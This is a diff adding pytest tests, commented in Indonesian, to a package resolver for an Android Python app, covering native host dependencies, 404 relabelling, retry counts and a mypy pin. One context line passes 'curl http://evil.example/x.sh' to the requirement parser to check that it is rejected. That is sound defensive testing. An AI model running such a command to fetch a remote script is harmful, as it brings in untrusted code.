@@ -952,3 +952,132 @@ class TestBengkelBugW:
         import pytest as _pt
         with _pt.raises(req_mod.RequirementError):
             req_mod.parse_requirement("curl http://evil.example/x.sh")
+
+
+class TestBengkelMiniV1018:
+    """Bengkel-mini penutup v1.0.18 (2026-08-17): panen UAT log 873 baris
+    + ekspedisi harta karun katalog. Semua bukti: breadcrumb device
+    2026-08-17 + docs/mass-test-armv7-2026-08-16.jsonl + bedah METADATA
+    wheel toko Chaquopy."""
+
+    def test_native_host_deps_kelas_bug_q_baru(self):
+        # pycurl gagal device "libcurl.so not found"; lameenc/pyproj gagal
+        # mass-test "libmp3lame.so/libproj.so not found". METADATA wheel
+        # Chaquopy menyebut host-dep ini tapi baru terbaca setelah wheel
+        # masuk cache (celah instal-pertama, kelas Bug Q).
+        expected = {
+            "pycurl": ["chaquopy-curl-openssl-3"],
+            "lameenc": ["chaquopy-lame"],
+            "pyproj": ["chaquopy-proj-openssl-3"],
+            # rantai dalam (bionic311 2026-08-17: pyproj gagal dlopen
+            # libtiff.so lalu libjpeg_chaquopy.so sebelum rantai lengkap)
+            "chaquopy-proj-openssl-3": [
+                "chaquopy-libcxx", "chaquopy-curl-openssl-3", "chaquopy-libtiff",
+            ],
+            "chaquopy-libtiff": ["chaquopy-libjpeg", "chaquopy-libcxx"],
+        }
+        for name, want in expected.items():
+            deps = resolve_mod.NATIVE_HOST_DEPS.get(name, [])
+            for dep in want:
+                assert dep in deps, (
+                    f"{name} harus memetakan {dep} di NATIVE_HOST_DEPS "
+                    "(kelas Bug Q: host-dep tak tertarik saat instal pertama)"
+                )
+
+    def test_hidden_dep_matplotlib_inline(self):
+        # Bukti device dua arah (UAT maraton 2026-08-16): ipython gagal saat
+        # matplotlib belum aktif, sukses setelah matplotlib terpasang.
+        # METADATA matplotlib-inline TIDAK menyebut matplotlib.
+        deps = resolve_mod.NATIVE_HOST_DEPS.get("matplotlib-inline", [])
+        assert "matplotlib" in deps, (
+            "matplotlib-inline harus menarik matplotlib (hidden-dep, "
+            "bukti device dua arah ipython)"
+        )
+
+    def test_http_404_emit_target_not_found_tanpa_detail(self, monkeypatch):
+        # Keputusan user 2026-08-17: 404 probe sumber = alur normal, label
+        # `target_not_found` TANPA detail; jangan lagi "http_fail HTTPError
+        # HTTP 404" palsu (±90 baris per sesi UAT menutupi error nyata).
+        from urllib.error import HTTPError
+
+        def fake_urlopen(req, timeout):
+            raise HTTPError(req.full_url, 404, "not found", {}, None)
+
+        monkeypatch.setattr(resolve_mod.urllib.request, "urlopen", fake_urlopen)
+        monkeypatch.setattr(resolve_mod, "_retry_wait", lambda *a, **k: None)
+        bridge = _FakeResolveBridge()
+        token = resolve_mod._CURRENT_BRIDGE.set(bridge)
+        pkg_token = resolve_mod._CURRENT_PACKAGE.set("demo")
+        try:
+            with pytest.raises(resolve_mod.ResolveError):
+                resolve_mod._http_get("https://chaquo.com/pypi-13.1/tidak-ada/")
+        finally:
+            resolve_mod._CURRENT_PACKAGE.reset(pkg_token)
+            resolve_mod._CURRENT_BRIDGE.reset(token)
+        stages = [e["stage"] for e in bridge.events]
+        assert "target_not_found" in stages, (
+            f"404 harus memancarkan target_not_found, bukan http_fail; stages={stages}"
+        )
+        assert "http_fail" not in stages, (
+            "404 tidak boleh lagi dicatat sebagai http_fail (label palsu)"
+        )
+        ev = next(e for e in bridge.events if e["stage"] == "target_not_found")
+        assert ev["detail"] == "", "target_not_found tanpa detail (keputusan user)"
+
+    def test_error_nyata_tetap_http_fail(self, monkeypatch):
+        # Relabel 404 TIDAK boleh menelan kegagalan sungguhan: kelas
+        # non-retryable yang bukan 404 (mis. sertifikat) wajib tetap
+        # http_fail supaya wifi kedip/MITM tetap kelihatan di Diagnostics.
+        import ssl
+
+        def fake_urlopen(req, timeout):
+            raise ssl.SSLCertVerificationError("cert salah")
+
+        monkeypatch.setattr(resolve_mod.urllib.request, "urlopen", fake_urlopen)
+        monkeypatch.setattr(resolve_mod, "_retry_wait", lambda *a, **k: None)
+        bridge = _FakeResolveBridge()
+        token = resolve_mod._CURRENT_BRIDGE.set(bridge)
+        pkg_token = resolve_mod._CURRENT_PACKAGE.set("demo")
+        try:
+            with pytest.raises(resolve_mod.ResolveError):
+                resolve_mod._http_get("https://pypi.org/pypi/demo/json")
+        finally:
+            resolve_mod._CURRENT_PACKAGE.reset(pkg_token)
+            resolve_mod._CURRENT_BRIDGE.reset(token)
+        stages = [e["stage"] for e in bridge.events]
+        assert "http_fail" in stages, (
+            f"kegagalan nyata (bukan 404) wajib tetap http_fail; stages={stages}"
+        )
+        assert "target_not_found" not in stages
+
+    def test_retry_budget_tiga_attempt_untuk_jaringan_kedip(self, monkeypatch):
+        # Bukti UAT 2026-08-16: yt-dlp gagal URLError attempt 2/2 lalu sukses
+        # manual — jaringan 4G user kedip sesaat. Budget kini 3.
+        import socket
+        calls = []
+
+        def fake_urlopen(req, timeout):
+            calls.append(timeout)
+            if len(calls) <= 2:
+                raise socket.timeout("kedip")
+            return _FakeHttpResponse(b"pulih-attempt-3")
+
+        monkeypatch.setattr(resolve_mod.urllib.request, "urlopen", fake_urlopen)
+        monkeypatch.setattr(resolve_mod, "_retry_wait", lambda *a, **k: None)
+        assert resolve_mod._http_get("https://pypi.org/pypi/demo/json") == b"pulih-attempt-3"
+        assert len(calls) == 3, (
+            "dua timeout beruntun harus masih pulih di attempt ke-3 "
+            f"(_MAX_HTTP_ATTEMPTS=3); calls={len(calls)}"
+        )
+
+    def test_manifest_pin_mypy_stable_pra_librt(self):
+        # mypy>=1.19 menarik librt (C-ext mypyc, tak ada wheel ARMv7 —
+        # https://mypy.readthedocs.io/en/stable/changelog.html). 1.18.2 =
+        # wheel py3-none-any murni + deps pure. Pola persis pin openai.
+        manifest = json.load(open(os.path.join(
+            ROOT, "app/src/main/assets/package_catalog/tested-manifest.json")))
+        assert "mypy" in manifest, "mypy harus dipin di tested-manifest"
+        vers = manifest["mypy"]
+        assert all(v.startswith("1.") for v in vers), (
+            f"pin mypy harus < 1.19 (librt tak punya wheel ARMv7); dapat {vers}"
+        )
